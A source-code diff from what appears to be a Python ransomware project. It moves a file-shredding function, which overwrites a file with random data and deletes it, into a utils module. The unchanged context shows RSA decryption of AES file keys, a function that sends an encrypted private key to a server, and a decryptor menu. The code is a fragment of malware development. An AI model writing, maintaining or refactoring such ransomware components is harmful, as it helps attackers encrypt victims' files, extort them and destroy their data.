@@ -1,5 +1,6 @@
 import enviroment
 import symmetric
+import utils
 
 import subprocess
 import requests
@@ -75,27 +76,6 @@ def decrypt_aes_keys(enc, key):
     key_obj = RSA.importKey(key)
     cipher = PKCS1_OAEP.new(key_obj)
     return cipher.decrypt(enc)
-    
-
-def shred(file_name,  passes=1):
-
-    def generate_data(length):
-        chars = string.ascii_lowercase + string.ascii_uppercase + string.digits
-        return ''.join(random.SystemRandom().choice(chars) for _ in range(length))
-
-    if not os.path.isfile(file_name):
-        print(file_name + " is not a file.")
-        return False
-
-    ld = os.path.getsize(file_name)
-    fh = open(file_name,  "w")
-    for _ in range(int(passes)):
-        data = generate_data(ld)
-        fh.write(data)
-        fh.seek(0,  0)
-
-    fh.close()
-    os.remove(file_name)
 
 
 def send_to_server_encrypted_private_key(id, private_encrypted_key):
@@ -180,7 +160,7 @@ def menu():
             f.write(decrypted_file_content)
         
         # delete old encrypted file
-        shred(_[1])
+        utils.shred(_[1])
 
     # end of decryptor
     print("{}Decryption finished!{}".format(GREEN, WHITE))
